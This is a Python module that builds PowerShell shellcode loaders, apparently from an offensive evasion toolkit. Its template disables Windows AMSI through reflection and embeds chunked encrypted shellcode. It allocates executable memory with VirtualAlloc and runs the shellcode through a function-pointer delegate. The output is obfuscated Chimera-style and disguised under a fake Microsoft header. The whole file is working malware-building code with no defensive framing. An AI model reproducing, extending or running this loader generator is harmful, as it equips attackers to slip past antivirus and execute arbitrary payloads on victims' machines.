"""
PowerShell loader generator.

Produces a .ps1 script containing:
  - AMSI bypass (obfuscated)
  - Encrypted shellcode array (chunked)
  - Decryption stubs for the full chain
  - VirtualAlloc + GetDelegateForFunctionPointer execution
  - Optional Chimera-style obfuscation
"""

import random
from ..utils import random_variable_name, split_into_chunks, bytes_to_ps1_array
from ..chain import decryption_stubs_ps1
from ..obfuscation import obfuscate_powershell, generate_microsoft_header


def generate(encrypted_bytes: bytes,
             chain_metadata: list[dict],
             obfuscation_level: int = 3,
             enable_obfuscation: bool = True,
             enable_debug: bool = False) -> str:
    """
    Build a complete PowerShell loader script.

    Args:
        encrypted_bytes:   Final encrypted shellcode (after full chain).
        chain_metadata:    Per-stage metadata list from chain.apply_chain().
        obfuscation_level: 1-5 (Chimera-style).
        enable_obfuscation: Whether to run the obfuscation pass.
        enable_debug:       Emit Write-Host diagnostics.

    Returns:
        Complete .ps1 source string.
    """
    # ---- shellcode chunks ------------------------------------------------
    chunks = split_into_chunks(encrypted_bytes)
    chunk_defs = []
    chunk_names = []
    for var, chunk in chunks:
        hex_arr = bytes_to_ps1_array(chunk)
        chunk_defs.append(f'[Byte[]] ${var} = {hex_arr}')
        chunk_names.append(f'${var}')
    concat_line = f'[Byte[]] $encrypted = {" + ".join(chunk_names)}'
    shellcode_block = '\n'.join(chunk_defs) + '\n\n' + concat_line

    # ---- decryption stubs ------------------------------------------------
    helpers, exec_code = decryption_stubs_ps1(chain_metadata)
    helper_block = '\n'.join(helpers)

    # ---- execution names (obfuscated) ------------------------------------
    cls_name  = random_variable_name(random.randint(10, 20))
    dlg_name  = random_variable_name(random.randint(10, 20))
    meth_name = random_variable_name(random.randint(10, 20))
    dll_p1    = random_variable_name(random.randint(8, 15))
    dll_p2    = random_variable_name(random.randint(8, 15))
    dll_p3    = random_variable_name(random.randint(8, 15))
    dll_p4    = random_variable_name(random.randint(8, 15))
    using1    = random_variable_name(random.randint(15, 25))
    using2    = random_variable_name(random.randint(15, 25))

    # ---- debug block -----------------------------------------------------
    if enable_debug:
        debug_block = (
            'Write-Host "[DEBUG] Encrypted: $($encrypted.Length) bytes"\n'
            'Write-Host "[DEBUG] Decrypted: $($buf.Length) bytes"'
        )
    else:
        debug_block = ''

    script = _TEMPLATE.format(
        shellcode_block=shellcode_block,
        helper_block=helper_block,
        exec_code=exec_code,
        debug_block=debug_block,
        cls_name=cls_name,
        dlg_name=dlg_name,
        meth_name=meth_name,
        dll_p1=dll_p1,
        dll_p2=dll_p2,
        dll_p3=dll_p3,
        dll_p4=dll_p4,
        using1=using1,
        using2=using2,
    )

    if enable_obfuscation:
        script = obfuscate_powershell(script, level=obfuscation_level)

    print("[*] Adding Microsoft PowerShell header...")
    return generate_microsoft_header() + script


# ---------------------------------------------------------------------------
# Template  (uses {{}} for literal PS braces)
# ---------------------------------------------------------------------------

_TEMPLATE = """\
$g = "Amsi"
$c = "Utils"
$ref = $g + $c
try {{
    $a = [Ref].Assembly.GetType("System.Management.Automation.$ref")
    $b = $a.GetField('amsiInitFailed','NonPublic,Static')
    $b.SetValue($null,$true)
}} catch {{}}

{shellcode_block}

{helper_block}

{exec_code}

{debug_block}

if ($buf.Length -eq 0) {{ exit }}

${using1} = "usi" + "ng Sys" + "tem;"
${using2} = "usi" + "ng Sys" + "tem.Run" + "time.Int" + "eropSer" + "vices;"

$Kernel32 = ${using1} + "`n" + ${using2} + "`n" + @"
public class {cls_name} {{
    private const string {dll_p1} = "ker";
    private const string {dll_p2} = "nel";
    private const string {dll_p3} = "32.";
    private const string {dll_p4} = "dll";
    [DllImport({dll_p1} + {dll_p2} + {dll_p3} + {dll_p4}, EntryPoint = "VirtualAlloc")]
    public static extern IntPtr {meth_name}(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}}
public delegate IntPtr {dlg_name}();
"@

$Win32 = Add-Type -TypeDefinition $Kernel32 -PassThru

$size = $buf.Length
$ptr = [{cls_name}]::{meth_name}([IntPtr]::Zero, $size, 0x3000, 0x40)
if ($ptr -eq [IntPtr]::Zero) {{ exit }}
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, $size)
$f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [{dlg_name}])
try {{ $f.Invoke() }} catch {{}}
"""
